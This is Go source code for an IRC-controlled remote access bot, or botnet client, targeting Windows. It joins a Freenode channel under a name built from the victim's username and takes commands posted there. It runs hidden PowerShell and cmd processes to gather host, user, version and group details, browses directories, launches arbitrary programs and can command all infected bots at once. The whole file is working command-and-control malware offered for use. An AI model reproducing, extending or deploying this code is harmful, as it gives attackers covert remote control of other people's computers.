package main

import (
	irc "github.com/gianarb/go-irc"
	parser "gopkg.in/sorcix/irc.v2"
	"context" //used in cmdExec
	"fmt"
	"os"
	"os/exec"
	"time"
	"syscall"
	"runtime" //Checking os on start
	"crypto/rand" // Generating unique ID
	"math/big" // Generating ID
	"strings"
	"bufio"
	"net/textproto"
	"log"
	"strconv"
)

// SET YOUR IRC CHANNEL NAME
var CHANNEL_NAME string = "##yourchannel"

/* ##############################
#### Split string into slice ####
#################################*/
func SplitLines(s string) []string {
	var lines []string
	sc := bufio.NewScanner(strings.NewReader(s))
	for sc.Scan() {
		lines = append(lines, sc.Text())
	}
	return lines
}


/* ##############################
#### Execute WIN os commands ####
#################################*/
func cmdExec(arg, arg2, arg3, arg4, arg5 string, result chan string) { // Rebuilt, still needs a set arg val to allow chan input
	// Create a new context and add a timeout to it
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel() // The cancel should be deferred so resources are cleaned up
	// Creates our CMD
	cmd := exec.Command("") //empty
	switch {
	case arg5 != "":
		cmd = exec.CommandContext(ctx, arg, arg2, arg3, arg4, arg5)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	case arg4 != "":
		cmd = exec.CommandContext(ctx, arg, arg2, arg3, arg4)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	case arg3 != "":
		cmd = exec.CommandContext(ctx, arg, arg2, arg3)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	case arg2 != "":
		cmd = exec.CommandContext(ctx, arg, arg2)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	case arg != "":
		cmd = exec.CommandContext(ctx, arg)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	default:
		cmd = exec.CommandContext(ctx, "echo 'no arg'")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	}
	out, err := cmd.Output()
	// Return cmd results -> string
	cmdOutput := string(out)

	// We want to check the context error to see if the timeout was executed.
	// The error returned by cmd.Output() will be OS specific based on what
	// happens when a process is killed.
	if ctx.Err() == context.DeadlineExceeded {
		
		result <- "Command timed out"
		return
	}

	// If there's no context error, we know the command completed (or errored).
	if err != nil {
		fmt.Println("Non-zero exit code:", err)
	}
	result <- cmdOutput
	return
}

/* ##########################
#### Format ls commands  ####
#############################*/
func ircformat(length int) (int, int) {
	amountval := length / 4
	remainval := length % 4
	if length < 4 {
		amountval = 0
		remainval = length
	}
	//fmt.Println("Number of times to print: " + strconv.Itoa(amountval))
	//fmt.Println("Number of remainder lines: " + strconv.Itoa(remainval))
	return amountval, remainval
}

/* ##############################
### Bot identity setup engine ###
#################################*/

func botSetup() string {
	// Determines if host is running WINDOWS
	osVal := "???-"
	if runtime.GOOS == "windows" {
		osVal = "WIN-"
	} else {
		osVal = "UNK-"
	}
	// Creates a random id
	num, err := rand.Int(rand.Reader, big.NewInt(9999))
	if err != nil {
		fmt.Print(err)
	}
	//fmt.Print(num, " has been generated\n") // 360 389 174 274 846
	numStr := num.String()
	// Looks up username
	result := make(chan string, 1)
	go cmdExec("powershell.exe", "$env:UserName", "", "", "", result)
	usrOut := <-result
	close(result)
	// Removes newlines and returns for version
	usrTrim := strings.TrimRight(usrOut, "\r\n")
	//Creates and returns bot nickname
	botName := osVal + usrTrim + "-" + numStr
	return botName
}


func ircloop() {
	// Set current working directory on slave
	currentWorkingDirectory, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}
	// Gen botname
	botname := botSetup()
	// Create bot
	bot := irc.NewBot(
		"",
		"irc.freenode.net:6667",
		botname,
		botname,
		CHANNEL_NAME,
		"",
	)
	/* ##################
	### Main bot loop ###
	#####################*/
	conn, _ := bot.Connect()
	defer conn.Close()
	verbose := false
	reader := bufio.NewReader(conn)
	tp := textproto.NewReader(reader)
	for {
		line, err := tp.ReadLine()
		if err != nil {
			log.Fatal("unable to connect to IRC server ", err)
		}

		// Parse IRC Lines
		message := parser.ParseMessage(line)

		// Debugging
		if verbose {
			fmt.Printf("%v \n", message)
		}
		switch {
			//Keep alive
		case message.Command == "PING":
			bot.Send(fmt.Sprint("PONG %d", time.Now().UnixNano()))
			// Debug
		//case message.Command == "JOIN":
			//fmt.Println("Successful join!")
		case message.Command == "PRIVMSG":
			banner := "PRIVMSG " + CHANNEL_NAME + " :"
			//if message.Params[0] == bot.Nick {
			if message.Params[0] == CHANNEL_NAME {
				// Choose the first value as our command id
				msg := message.Params[1]
				// Create an array to seperate command and arguements
				msgArray := strings.Fields(msg)

				switch msgArray[0] {
				case botname:
					/* #################################
				    ### Switch to handle commands #####
				    #################################*/
					switch msgArray[1] {
						// Case for golang ls command, no arguements but stealthier
						/*
						case "help", "HELP", "?":
						
						*/
						case "ls", "dir", "LS", "DIR":
							file, err := os.Open(currentWorkingDirectory)
							if err != nil {
								log.Fatal(err)
							}
							split, err := file.Readdirnames(0)
							if err != nil {
								log.Fatal(err)
							}
							//fmt.Println("Length of split: ")
							splitlen := len(split)
							//fmt.Println(splitlen)
							amt, rem := ircformat(splitlen)
							/* ##########################
							### Send output to irc ###
							##########################*/
							bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
							// Avoid throttle
							for i := 0; i < len(split); i++ {
								if amt == 0 {
									//continue
								} else {
									bot.Send(fmt.Sprint(banner + " [" + split[i] + "] [" + split[i+1] + "] [" + split[i+2] + "] [" + split[i+3] + "]"))
									i = i + 3
									amt = amt - 1
								}
								if amt == 0 && rem == 0 {
									//continue
								} else if amt == 0 && rem != 0 {
									if rem == 3 {
										bot.Send(fmt.Sprint(banner + " [" + split[i] + "] [" + split[i+1] + "] [" + split[i+2] + "]"))
										rem = rem - 3
									} else if rem == 2 {
										bot.Send(fmt.Sprint(banner + " [" + split[i] + "] [" + split[i+1] + "]"))
										rem = rem - 2
									} else if rem == 1 {
										bot.Send(fmt.Sprint(banner + " [" + split[i] + "]"))
										rem = rem - 1
									}
								}
								time.Sleep(500 * time.Millisecond)
							}
							bot.Send(fmt.Sprint(banner + "<///"))
						// Case for golang cd
						case "cd", "CD":
							//fmt.println(len(msgArray))
							if len(msgArray) == 2 {
								msg := "[!] Please enter an arguement for cd"
								//fmt.println(msg)
								bot.Send(fmt.Sprint(banner + msg))
							} else if len(msgArray) >= 4 {
								msg := "[!] Please enter only ONE arguement for cd"
								//fmt.println(msg)
								bot.Send(fmt.Sprint(banner + msg))
							} else {
								// Changes dir based on arguement given
								os.Chdir(msgArray[2])
								newDir, err := os.Getwd()
								if err != nil {
									log.Fatal(err)
								}
								// Set new working directory
								currentWorkingDirectory = newDir
								/* ##########################
								### Send output to irc ###
								##########################*/
								bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
								bot.Send(fmt.Sprint(banner + "[!] New Dir ->: " + newDir))
								//fmt.printf("Current Working Directory: %s\n", newDir)
								bot.Send(fmt.Sprint(banner + "<///"))
							}
						// case for golang pwd
						case "pwd", "PWD":
							//fmt.println(len(msgArray))
							if len(msgArray) > 2 {
								msg := "[!] No arguements accepted for pwd"
								//fmt.println(msg)
								bot.Send(fmt.Sprint(banner + msg))
							} else {
								/* #########################
								#### Send CWD to irc ####
								#########################*/
								bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
								bot.Send(fmt.Sprint(banner + "[~] Current Dir ->: " + currentWorkingDirectory))
								//fmt.printf("Current Working Directory: %s\n", currentWorkingDirectory)
								bot.Send(fmt.Sprint(banner + "<///"))
							}
						//case for info gathering
						
						case "info", "INFO":
							//fmt.println(len(msgArray))
							if len(msgArray) > 2 {
								msg := "[!] No arguements accepted"
								//fmt.println(msg)
								bot.Send(fmt.Sprint(banner + msg))
							} else {
								// Executes whoami and determines windows version
								result := make(chan string, 1)
								cmdExec("cmd.exe", "/c", "whoami", "", "", result)
								whoResult := <-result
								close(result)

								result2 := make(chan string, 1)
								cmdExec("cmd.exe", "/c", "powershell", `(Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ReleaseId).ReleaseId`, "", result2)
								verResult := <-result2
								close(result2)

								result3 := make(chan string, 1)
								cmdExec("cmd.exe", "/c", "echo %username%", "", "", result3)
								usrResult := <-result3
								close(result3)
								// Removes newlines and returns for version
								verTrim := strings.TrimRight(verResult, "\r\n")
								usrTrim := strings.TrimRight(usrResult, "\r\n")
								// Displays info of trimmed usr
								result4 := make(chan string, 1)
								cmdExec("cmd.exe", "/c", "net user "+usrTrim+" | findstr Group", "", "", result4)
								netResult := <-result4
								close(result4)
								// Turn verion into an integer
								verint, _ := strconv.Atoi(verTrim)
								// Splits netuser on newlines
								split := SplitLines(netResult)
								/* ##########################
								### Send output to irc ###
								##########################*/
								//fmt.println(" :" + verTrim + ": ")
								bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
								bot.Send(fmt.Sprint(banner + "[~] Hostname ->: " + whoResult))
								bot.Send(fmt.Sprint(banner + "[~] Username ->: " + usrTrim))
								bot.Send(fmt.Sprint(banner + "[~] Version ->: " + verTrim))
								// Simple version check to see if curl is installed
								if verint >= 1803 {
									bot.Send(fmt.Sprint(banner + "[~] Curl Download/Upload supported"))
								} else if verint < 1803 {
									bot.Send(fmt.Sprint(banner + "[~] Curl Download/Upload unsupported"))
								}
								bot.Send(fmt.Sprint(banner + "[~] Net User information //>"))
								// Avoid throttle printing user info
								time.Sleep(500 * time.Millisecond)
								for i := 0; i < len(split); i++ {
									bot.Send(fmt.Sprint(banner + "" + split[i]))
									time.Sleep(2000 * time.Millisecond)
								}
								// Debug
								//fmt.printf("Hostname of slave: %s\n", whoOut)
								bot.Send(fmt.Sprint(banner + "<///"))
							}
		
						
							//case for running start via cmd
						case "start", "START":
							//fmt.println(len(msgArray))
							if len(msgArray) <= 2 {
								msg := "[!] Please enter an arguement for start"
								//fmt.println(msg)
								bot.Send(fmt.Sprint(banner + msg))
							} else if len(msgArray) == 3 {
								// Executes first given arguement
								argval1 := msgArray[2]
								//fmt.println("Cmd arguement is: " + argval1)
								result := make(chan string, 1)
								go cmdExec("powershell.exe", "start", argval1, "", "", result)
								usrOut := <-result
								close(result)
								/* ##########################
								### Send output to irc ###
								##########################*/
								bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
								bot.Send(fmt.Sprint(banner + "[~] executed ->: " + argval1))
								if usrOut == "" {
									bot.Send(fmt.Sprint(banner + "[>] Output: Success"))
								} else {
									bot.Send(fmt.Sprint(banner + "[>] Output: " + usrOut))
								}
								bot.Send(fmt.Sprint(banner + "<///"))
								} else if len(msgArray) > 3 {
								// Sets start point for loop
								argval1 := msgArray[2]
								// Uses a for loop to turn arguement strings with spaces into one entity
								arguementStr := msgArray[3]
								for i := 4; i < len(msgArray); i++ {
									arguementStr = arguementStr + " " + msgArray[i]
								}
								// Executes arguement
								//fmt.println("Cmd arguement is: " + arguementStr)
								result := make(chan string, 1)
								go cmdExec("powershell.exe", "start", argval1, arguementStr, "", result)
								usrOut := <-result
								close(result)
								/* ##########################
								### Send output to irc ###
								##########################*/
								bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
								bot.Send(fmt.Sprint(banner + "[~] Started " + argval1 + " with arg: " + arguementStr))
								if usrOut == "" {
									bot.Send(fmt.Sprint(banner + "[>] Output: Success"))
								} else {
									bot.Send(fmt.Sprint(banner + "[>] Output: " + usrOut))
								}
								bot.Send(fmt.Sprint(banner + "<///"))
								} else {
								// Error handling
								msg := "[!] Error when parsing msgArray(len)"
								//fmt.println(msg)
								bot.Send(fmt.Sprint(banner + msg))
							}
						case "shutdown", "SHUTDOWN":
							bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
							bot.Send(fmt.Sprint(banner + "[!!!] DISCONNECTING"))
							bot.Send(fmt.Sprint(banner + "<///"))
							conn.Close()
							break
							// End of switch
						}
				case "ALL", "all":
					/* #################################
				    ### Switch to handle ALL bots #####
				    #################################*/
					switch msgArray[1] {
						//case for running start via cmd
						case "start", "START":
							//fmt.println(len(msgArray))
							if len(msgArray) <= 2 {
								msg := "[!] Please enter an arguement for start"
								//fmt.println(msg)
								bot.Send(fmt.Sprint(banner + msg))
							} else if len(msgArray) == 3 {
								// Executes first given arguement
								argval1 := msgArray[2]
								//fmt.println("Cmd arguement is: " + argval1)
								result := make(chan string, 1)
								go cmdExec("powershell.exe", "start", argval1, "", "", result)
								usrOut := <-result
								close(result)
								/* ##########################
								### Send output to irc ###
								##########################*/
								bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
								bot.Send(fmt.Sprint(banner + "[~] executed ->: " + argval1))
								if usrOut == "" {
									bot.Send(fmt.Sprint(banner + "[>] Output: Success"))
								} else {
									bot.Send(fmt.Sprint(banner + "[>] Output: " + usrOut))
								}
								bot.Send(fmt.Sprint(banner + "<///"))
								} else if len(msgArray) > 3 {
								// Sets start point for loop
								argval1 := msgArray[2]
								// Uses a for loop to turn arguement strings with spaces into one entity
								arguementStr := msgArray[3]
								for i := 4; i < len(msgArray); i++ {
									arguementStr = arguementStr + " " + msgArray[i]
								}
								// Executes arguement
								//fmt.println("Cmd arguement is: " + arguementStr)
								result := make(chan string, 1)
								go cmdExec("powershell.exe", "start", argval1, arguementStr, "", result)
								usrOut := <-result
								close(result)
								/* ##########################
								### Send output to irc ###
								##########################*/
								bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
								bot.Send(fmt.Sprint(banner + "[~] Started " + argval1 + " with arg: " + arguementStr))
								if usrOut == "" {
									bot.Send(fmt.Sprint(banner + "[>] Output: Success"))
								} else {
									bot.Send(fmt.Sprint(banner + "[>] Output: " + usrOut))
								}
								bot.Send(fmt.Sprint(banner + "<///"))
								} else {
								// Error handling
								msg := "[!] Error when parsing msgArray(len)"
								//fmt.println(msg)
								bot.Send(fmt.Sprint(banner + msg))
							}
						//case for killing bots
						case "shutdown", "SHUTDOWN":
							bot.Send(fmt.Sprint(banner + "///> " + msgArray[0]))
							bot.Send(fmt.Sprint(banner + "[!!!] DISCONNECTING"))
							bot.Send(fmt.Sprint(banner + "<///"))
							conn.Close()
							break
							// End of switch
					}
				}
			}
		}
	}
}



func main() {
	ircloop()
}
